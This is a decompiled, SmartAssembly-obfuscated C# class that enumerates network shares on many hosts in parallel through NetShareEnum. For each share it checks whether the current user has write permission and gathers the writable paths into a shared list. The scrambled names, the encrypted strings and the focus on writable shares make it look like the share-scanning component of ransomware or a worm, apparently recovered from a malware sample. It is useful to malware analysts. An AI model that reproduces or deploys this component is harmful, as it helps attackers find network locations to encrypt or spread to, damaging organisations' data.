using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace uBrdXrCSgnwM;

internal sealed class iCscnGQlBeKHP
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct XlqjWgZthYyB
	{
		public string WgpNLRLOAq;

		public uint BqlIYeIeswwhz;

		public string TnHQDcUxwNAeCUa;

		public XlqjWgZthYyB(string string_0, uint uint_0, string string_1)
		{
			WgpNLRLOAq = string_0;
			BqlIYeIeswwhz = uint_0;
			TnHQDcUxwNAeCUa = string_1;
		}

		public override string ToString()
		{
			return WgpNLRLOAq;
		}
	}

	private sealed class iujFOyinyAwV
	{
		public PZTnpKYTfUuGAQpL.XvdETHknrHYVBv LSAUmZbPqF;
	}

	private sealed class LUPgeKlsTUHnv
	{
		public iujFOyinyAwV OjaSHpyzJN;

		public string nTKPhPHhuZESL;

		public void _003CGetAllShares_003Eb__1()
		{
			emwiPLjFqBBX(nTKPhPHhuZESL, OjaSHpyzJN.LSAUmZbPqF);
		}
	}

	public static ReaderWriterLockSlim rwyNGpOIld;

	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("Netapi32.dll", SetLastError = true)]
	private static extern int NetApiBufferFree(IntPtr intptr_0);

	[DllImport("Netapi32.dll", CharSet = CharSet.Unicode)]
	private static extern int NetShareEnum(StringBuilder stringBuilder_0, int int_0, ref IntPtr intptr_0, uint uint_0, ref int int_1, ref int int_2, ref int int_3);

	public static XlqjWgZthYyB[] TXtvbGHPqj(string string_0)
	{
		List<XlqjWgZthYyB> list = new List<XlqjWgZthYyB>();
		int int_ = 0;
		int int_2 = 0;
		int int_3 = 0;
		int num = Marshal.SizeOf(typeof(XlqjWgZthYyB));
		IntPtr intptr_ = IntPtr.Zero;
		StringBuilder stringBuilder_ = new StringBuilder(string_0);
		int num2 = NetShareEnum(stringBuilder_, 1, ref intptr_, uint.MaxValue, ref int_, ref int_2, ref int_3);
		if (num2 == 0)
		{
			IntPtr ptr = intptr_;
			for (int i = 0; i < int_; i++)
			{
				XlqjWgZthYyB item = (XlqjWgZthYyB)Marshal.PtrToStructure(ptr, typeof(XlqjWgZthYyB));
				list.Add(item);
				ptr += num;
			}
			NetApiBufferFree(intptr_);
			return list.ToArray();
		}
		list.Add(new XlqjWgZthYyB(getString_0(107407232) + num2, 10u, string.Empty));
		return list.ToArray();
	}

	public static void emwiPLjFqBBX(string string_0, PZTnpKYTfUuGAQpL.XvdETHknrHYVBv xvdETHknrHYVBv_0)
	{
		string[] source = new string[2]
		{
			getString_0(107407223),
			getString_0(107407178)
		};
		XlqjWgZthYyB[] array = TXtvbGHPqj(string_0);
		if (array.Length > 0)
		{
			List<string> list = new List<string>();
			List<string> list2 = new List<string>();
			List<string> list3 = new List<string>();
			WindowsIdentity current = WindowsIdentity.GetCurrent();
			string value = current.User!.Value;
			XlqjWgZthYyB[] array2 = array;
			for (int i = 0; i < array2.Length; i++)
			{
				XlqjWgZthYyB xlqjWgZthYyB = array2[i];
				if (xvdETHknrHYVBv_0.bdcGOAAkERDGF != null && xvdETHknrHYVBv_0.bdcGOAAkERDGF.Contains(xlqjWgZthYyB.WgpNLRLOAq.ToString().ToUpper()))
				{
					continue;
				}
				try
				{
					string text = string.Format(getString_0(107407197), string_0, xlqjWgZthYyB.WgpNLRLOAq);
					Directory.GetFiles(text);
					list.Add(xlqjWgZthYyB.WgpNLRLOAq);
					AuthorizationRuleCollection accessRules = Directory.GetAccessControl(text).GetAccessRules(includeExplicit: true, includeInherited: true, typeof(SecurityIdentifier));
					foreach (FileSystemAccessRule item in accessRules)
					{
						if ((item.IdentityReference.ToString() == value || current.Groups!.Contains(item.IdentityReference)) && item.FileSystemRights.HasFlag(FileSystemRights.Write) && item.AccessControlType == AccessControlType.Allow)
						{
							if (!fQUgTOUpJumL.qyAhWYLrtiOtS.Contains(text))
							{
								fQUgTOUpJumL.qyAhWYLrtiOtS.Add(text);
							}
							list2.Add(xlqjWgZthYyB.WgpNLRLOAq);
							break;
						}
					}
				}
				catch
				{
					if (!source.Contains(xlqjWgZthYyB.WgpNLRLOAq))
					{
						list3.Add(xlqjWgZthYyB.WgpNLRLOAq);
					}
				}
			}
		}
		hcvldybcVVrE.uPBrDSJKasgqZpMI++;
	}

	public static void CdMJoAYaoly(List<string> list_0, PZTnpKYTfUuGAQpL.XvdETHknrHYVBv xvdETHknrHYVBv_0)
	{
		iujFOyinyAwV iujFOyinyAwV = new iujFOyinyAwV();
		iujFOyinyAwV.LSAUmZbPqF = xvdETHknrHYVBv_0;
		List<Action> list = new List<Action>();
		using (List<string>.Enumerator enumerator = list_0.GetEnumerator())
		{
			while (enumerator.MoveNext())
			{
				Action action = null;
				LUPgeKlsTUHnv CS_0024_003C_003E8__locals0 = new LUPgeKlsTUHnv();
				CS_0024_003C_003E8__locals0.OjaSHpyzJN = iujFOyinyAwV;
				CS_0024_003C_003E8__locals0.nTKPhPHhuZESL = enumerator.Current;
				action = delegate
				{
					emwiPLjFqBBX(CS_0024_003C_003E8__locals0.nTKPhPHhuZESL, CS_0024_003C_003E8__locals0.OjaSHpyzJN.LSAUmZbPqF);
				};
				list.Add(action);
			}
		}
		ParallelOptions parallelOptions = new ParallelOptions();
		parallelOptions.MaxDegreeOfParallelism = iujFOyinyAwV.LSAUmZbPqF.CivUSorGdLrWvG;
		ParallelOptions parallelOptions2 = parallelOptions;
		Parallel.Invoke(parallelOptions2, list.ToArray());
	}

	static iCscnGQlBeKHP()
	{
		Strings.CreateGetStringDelegate(typeof(iCscnGQlBeKHP));
		rwyNGpOIld = new ReaderWriterLockSlim();
	}
}
